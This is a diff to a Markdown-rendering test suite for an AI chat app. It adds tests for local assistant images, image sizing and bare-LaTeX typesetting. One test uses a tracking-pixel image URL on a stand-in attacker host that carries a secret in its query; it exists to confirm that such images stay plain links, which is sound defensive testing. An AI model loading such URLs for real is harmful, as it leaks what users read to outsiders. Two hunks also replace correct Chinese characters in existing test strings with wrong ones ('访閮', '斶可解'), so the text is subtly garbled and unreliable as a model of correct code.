@@ -296,6 +296,45 @@ describe('Markdown images', () => {
     expect(html.match(/<a /g)).toHaveLength(2);
   });
 
+  test('draws a local assistant image in place without giving the browser a path', () => {
+    const html = renderMarkdownSync('![after login](screens/after-login.png)', 'assistant-local');
+
+    // The image element carries the source for the grant step, never a `src`:
+    // an unverified path in `src` would be a request the browser makes on its own.
+    expect(html).toContain('<img');
+    expect(html).toContain('data-oc-md-image-source="screens/after-login.png"');
+    expect(html).toContain('data-oc-md-image-filename="after-login.png"');
+    expect(html).not.toContain('src="screens/after-login.png"');
+    expect(html).not.toContain('data-openchamber-markdown-image-label');
+  });
+
+  test('keeps a remote assistant image a link, because a load reports what is read', () => {
+    const html = renderMarkdownSync('![tracker](https://evil.example/pixel.png?seen=secret)', 'assistant-local');
+
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('data-oc-md-image-source');
+    expect(html).toContain('<a href="https://evil.example/pixel.png?seen=secret" class="external-link"');
+  });
+
+  test('lets the agent size an image through the Markdown title', () => {
+    // Markdown has no size syntax, so the title slot carries it.
+    const sized = renderMarkdownSync('![after login](screens/a.png "640x480")', 'assistant-local');
+    expect(sized).toContain('width="640"');
+    expect(sized).toContain('height:480px');
+
+    const widthOnly = renderMarkdownSync('![shot](screens/a.png "320")', 'assistant-local');
+    expect(widthOnly).toContain('width="320"');
+    expect(widthOnly).not.toContain('height:');
+  });
+
+  test('ignores a size it cannot trust', () => {
+    for (const title of ['99999', '0', '-40', 'big', '640x99999', '640x']) {
+      const html = renderMarkdownSync(`![shot](screens/a.png "${title}")`, 'assistant-local');
+      expect(html).not.toContain('width=');
+      expect(html).not.toContain('height:');
+    }
+  });
+
   test('collects image syntax across mixed Markdown and ignores links and code', () => {
     const candidates = extractMarkdownImageCandidates([
       [
@@ -421,7 +460,7 @@ describe('CJK-aware link parsing', () => {
   const hrefOf = (html: string): string | null => /<a\b[^>]*href="([^"]*)"/.exec(html)?.[1] ?? null;
 
   test('bare URL followed by a CJK annotation trims the annotation from the href', () => {
-    const html = renderMarkdownSync('访问 https://example.com/docs（中文说明）了解更多');
+    const html = renderMarkdownSync('访閮 https://example.com/docs（中文说明）了解更多');
     expect(hrefOf(html)).toBe('https://example.com/docs');
   });
 
@@ -639,6 +678,94 @@ describe('Escaped brackets versus display math', () => {
   });
 });
 
+describe('Bare LaTeX rendering', () => {
+  // A model asked for "R excluding 1" answers `R \setminus {1}` with no
+  // delimiter at all. Delimiters are the one thing a reader cannot infer, so
+  // an expression the model already wrote as LaTeX should read as math.
+  test('does not swallow prose between two expressions', () => {
+    // Regression, found by reading a real message in a running app: the run
+    // used to continue across whitespace into ordinary words, so "and" was
+    // rendered as three italic maths variables.
+    const html = renderMarkdownSync('Whole R excluding 1 is \\mathbb{R} \\setminus \\{1\\} and \\alpha + \\beta = \\sqrt{2}');
+
+    // Two expressions, and the word between them stays a word. KaTeX keeps the
+    // original source in an annotation element, so the commands themselves are
+    // still in the HTML by design - what matters is what the reader sees.
+    expect(html).toContain('∖');
+    // Strip the markup and the word is still a word, not three variables.
+    expect(html.replace(/<[^>]*>/g, '')).toContain(' and ');
+    expect(html).not.toContain('𝑎𝑛𝑑');
+    expect(html).not.toContain('katex-error');
+  });
+
+test('keeps an exponent on its command', () => {
+    const html = renderMarkdownSync('\\sum_{i=1}^n x_i');
+
+    expect(html).toContain('katex');
+    expect(html).not.toContain('katex-error');
+  });
+
+test('leaves a delimited-free set expression', () => {
+    const html = renderMarkdownSync('Whole R excluding 1 is \\mathbb{R} \\setminus \\{1\\}');
+
+    expect(html).toContain('katex');
+    expect(html).not.toContain('katex-error');
+    // The visible text is typeset: the blackboard R and the set-minus sign are
+    // markup, not the literal source the model typed.
+    expect(html).toContain('mathbb');
+    expect(html).toContain('∖');
+  });
+
+  test('typesets bare Greek and operators anchored by punctuation or space', () => {
+    for (const source of [
+      '\\cup A',
+      'A \\cup B',
+      '(\\cup A)',
+      'x \\neq 1',
+      '\\alpha + \\beta',
+      '\\sqrt{2}',
+      '\\int_0^1 x dx',
+    ]) {
+      const html = renderMarkdownSync(source);
+      expect(html).toContain('katex');
+      expect(html).not.toContain('katex-error');
+    }
+  });
+
+  test('leaves Windows paths, escapes and UNC shares as text', () => {
+    for (const source of [
+      'C:\\Users\\me\\project',
+      'tab\\there',
+      '\\\\server\\share\\file',
+      'line\\nbreak',
+      'a\\nb',
+    ]) {
+      const html = renderMarkdownSync(source);
+      expect(html).not.toContain('katex');
+    }
+  });
+
+  test('leaves a single-letter command and prose letters as text', () => {
+    // `x` and `y` are ordinary prose. Without a real command anchoring the
+    // run there is nothing to typeset.
+    expect(renderMarkdownSync('x and y are not equal')).not.toContain('katex');
+    expect(renderMarkdownSync('it happened at 3\\pm')).not.toContain('katex');
+    // A longer word that merely starts with a command name is not a command.
+    expect(renderMarkdownSync('the \\cube here')).not.toContain('katex');
+  });
+
+  test('does not re-render inside code, and never touches finished math', () => {
+    expect(renderMarkdownSync('`\\cup A`')).not.toContain('katex');
+    expect(renderMarkdownSync('```\n\\cup A\n```')).not.toContain('katex');
+
+    // KaTeX keeps the original source in an annotation element. A second pass
+    // over that text would typeset the finished math a second time.
+    const rendered = renderMarkdownSync('$\\cup A$');
+    expect(rendered).toContain('katex');
+    expect(rendered.match(/class="katex"/g)).toHaveLength(1);
+  });
+});
+
 describe('Dollar math rendering', () => {
   // Follow-up to openchamber/openchamber#2318: single-dollar inline math used
   // to be unsupported, so `$y$` reached the chat as literal text.
@@ -654,7 +781,7 @@ describe('Dollar math rendering', () => {
 
   test('renders inline math with a comparison operator', () => {
     // `>` is HTML-escaped by marked before this pass runs.
-    const html = renderMarkdownSync('当 $n > p$ 且 $\\mathrm{rank}(X) = p+1$ 时可解');
+    const html = renderMarkdownSync('当 $n > p$ 且 $\\mathrm{rank}(X) = p+1$ 斶可解');
     expect(html).toContain('katex');
     expect(html).not.toContain('katex-error');
   });
